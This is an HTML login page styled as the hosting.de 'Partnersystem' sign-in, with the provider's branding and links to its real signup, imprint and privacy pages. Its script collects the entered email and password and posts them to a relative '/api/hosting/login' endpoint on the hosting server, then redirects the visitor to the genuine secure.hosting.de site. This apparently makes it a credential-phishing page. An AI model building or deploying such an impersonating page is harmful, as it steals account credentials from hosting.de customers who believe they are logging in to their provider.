<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Partnersystem</title>
  <meta name="application-name" content="Partnersystem" />
  <meta name="theme-color" content="#8ac9ff" />
  <link rel="shortcut icon" href="hosting-assets/favicon.ico" />
  <link rel="icon" type="image/png" sizes="32x32" href="hosting-assets/favicon-32x32.png" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    html, body {
      height: 100%;
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
      font-size: 14px;
      color: #383838;
      -webkit-font-smoothing: antialiased;
    }

    a {
      color: #1773b0;
      text-decoration: none;
      transition: color 80ms;
    }

    a:hover { color: #0e4468; }

    #loginContainer {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #8ac9ff url("hosting-assets/images/login-bg.jpg") center/cover no-repeat;
      padding: 20px;
    }

    .login-panel {
      width: 100%;
      max-width: 420px;
      background: #fff;
      border-radius: 2px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.18);
      overflow: hidden;
    }

    .panel-heading {
      padding: 28px 28px 0;
      text-align: center;
    }

    .logo-row {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-bottom: 8px;
    }

    .logo-row img { width: 32px; height: 32px; }

    .logo-text {
      font-size: 22px;
      font-weight: 700;
      letter-spacing: -0.02em;
      color: #1a1a1a;
    }

    .logo-text span { color: #1773b0; }

    .panel-subtitle {
      font-size: 13px;
      color: #666;
      margin-bottom: 4px;
    }

    .panel-body {
      padding: 24px 28px 28px;
    }

    .field {
      margin-bottom: 16px;
    }

    .field label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #383838;
      margin-bottom: 6px;
    }

    .field input {
      width: 100%;
      height: 42px;
      border: 1px solid #c8d6e0;
      border-radius: 2px;
      padding: 0 12px;
      font-size: 14px;
      font-family: inherit;
      color: #383838;
      background: #fff;
      outline: none;
      transition: border-color 80ms, box-shadow 80ms;
    }

    .field input:focus {
      border-color: #1773b0;
      box-shadow: 0 0 0 2px rgba(23, 115, 176, 0.15);
    }

    .field-password {
      position: relative;
    }

    .toggle-pw {
      position: absolute;
      right: 10px;
      top: 34px;
      background: none;
      border: none;
      cursor: pointer;
      color: #858585;
      padding: 4px;
      line-height: 0;
    }

    .toggle-pw:hover { color: #1773b0; }

    .links-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 4px 0 20px;
      font-size: 13px;
    }

    .btn-login {
      width: 100%;
      height: 42px;
      border: 1px solid #1773b0;
      background: #1773b0;
      color: #fff;
      font-size: 14px;
      font-weight: 600;
      font-family: inherit;
      border-radius: 2px;
      cursor: pointer;
      transition: background 80ms, border 80ms;
    }

    .btn-login:hover:not(:disabled) {
      background: #0e4468;
      border-color: #0e4468;
    }

    .btn-login:disabled {
      opacity: 0.7;
      cursor: wait;
    }

    .panel-footer {
      padding: 14px 28px 20px;
      border-top: 1px solid #e8eef2;
      text-align: center;
      font-size: 12px;
      color: #858585;
    }

    .panel-footer a { font-weight: 500; }

    .cookie-hint {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: rgba(30, 30, 30, 0.92);
      color: #f2f5f8;
      font-size: 12px;
      padding: 10px 16px;
      text-align: center;
      z-index: 10;
    }
  </style>
</head>
<body class="login">

  <div id="loginContainer">
    <div class="login-panel">
      <div class="panel-heading">
        <div class="logo-row">
          <img src="hosting-assets/logo.svg" alt="" width="32" height="32" />
          <div class="logo-text">hosting<span>.de</span></div>
        </div>
        <p class="panel-subtitle">Partnersystem</p>
      </div>

      <div class="panel-body">
        <form id="hosting-login-form" method="POST" novalidate>
          <div class="field">
            <label for="email">Login-E-Mail-Adresse</label>
            <input
              type="text"
              id="email"
              name="email"
              autocomplete="username"
              required
            />
          </div>

          <div class="field field-password">
            <label for="password">Passwort</label>
            <input
              type="password"
              id="password"
              name="password"
              autocomplete="current-password"
              required
            />
            <button type="button" class="toggle-pw" id="toggle-pw" aria-label="Passwort anzeigen">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
                <circle cx="12" cy="12" r="3"/>
              </svg>
            </button>
          </div>

          <div class="links-row">
            <a href="https://secure.hosting.de/login" target="_blank" rel="noopener">Passwort vergessen</a>
            <a href="https://secure.hosting.de/signup/" target="_blank" rel="noopener">Registrieren</a>
          </div>

          <button type="submit" class="btn-login" id="submit-btn">Einloggen</button>
        </form>
      </div>

      <div class="panel-footer">
        &copy; hosting.de GmbH &middot;
        <a href="https://www.hosting.de/impressum" target="_blank" rel="noopener">Impressum</a> &middot;
        <a href="https://www.hosting.de/datenschutz" target="_blank" rel="noopener">Datenschutz</a>
      </div>
    </div>
  </div>

  <div class="cookie-hint">
    Für eine erfolgreiche Anmeldung muss Ihr Browser Cookies akzeptieren.
  </div>

  <script>
    document.getElementById("toggle-pw").addEventListener("click", function () {
      const pw = document.getElementById("password");
      pw.type = pw.type === "password" ? "text" : "password";
    });

    document.getElementById("hosting-login-form").addEventListener("submit", async function (e) {
      e.preventDefault();
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;
      if (!email || !password) return;

      const btn = document.getElementById("submit-btn");
      btn.disabled = true;
      btn.textContent = "Wird angemeldet …";

      try {
        const res = await fetch("/api/hosting/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, password }),
        });
        if (!res.ok) throw new Error("request failed");
      } catch (_) {
        btn.disabled = false;
        btn.textContent = "Einloggen";
        return;
      }

      window.location.href = "https://secure.hosting.de/";
    });
  </script>
</body>
</html>
